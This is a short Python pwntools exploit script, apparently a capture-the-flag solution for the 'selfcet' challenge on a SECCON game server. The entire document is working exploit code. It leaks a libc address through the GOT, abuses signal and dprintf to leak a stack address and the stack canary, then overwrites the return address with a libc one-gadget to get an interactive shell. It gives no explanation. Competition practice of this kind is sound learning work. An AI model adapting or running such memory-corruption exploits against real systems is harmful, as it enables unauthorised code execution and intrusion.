import os

os.environ["PWNLIB_NOTERM"] = "1"
from pwn import *

context.arch = 'amd64'
context.bits = 64

while True:
    r = remote("selfcet.seccon.games", 9999)

    try:
        r.send(flat({
            0x48: 0x403FE8,  # read@got
            0x50: b"\x10\x20",
        }))
        r.recvuntil(b"xor: ")
        leak = r.recvuntil(b": Success")[:-9]
        libc = ELF("selfcet.libc")
        libc.address = u64(leak.ljust(8, b"\x00")) - libc.symbols["read"]
        print("libc.address", hex(libc.address))

        r.send(flat({
            0x48 - 32: p32(6),
            0x40 - 32: 0x401020,  # _start
            0x50 - 32: libc.symbols["signal"],
        }).ljust(0x58, b"\x00"))

        #

        r.recvuntil(b"terminated\n")
        r.send(flat({
            0x48: p32(1),
            0x40: next(libc.search(b"%s(%s%c%#tx) [%p]")),
            0x50: libc.symbols["dprintf"],
        }).ljust(0x58, b"\x00"))
        r.recvuntil(b"0x7")
        stack_leak = int(b"0x7" + r.recvuntil(b")")[:-1], 16)
        r.recvuntil(b"]")
        print("stack_leak", hex(stack_leak))

        r.send(flat({
            0x48 - 32: p32(1),
            0x40 - 32: stack_leak + 0x290 + 1,
            0x50 - 32: libc.symbols["dprintf"],
        }).ljust(0x58, b"\x00"))
        stack_cookie = b"\x00" + r.recvn(7)
        print("stack_cookie", stack_cookie)

        r.recvuntil(b"terminated\n")

        r.send(b"\x00" * 32)
        time.sleep(0.5)

        payload = b""
        payload += b"\x00" * (88 - 0x20)
        payload += stack_cookie
        payload += p64(0x404800)
        payload += p64(libc.address + 0xebcf8)
        r.send(payload)

        r.interactive()
    except EOFError:
        continue
    finally:
        r.close()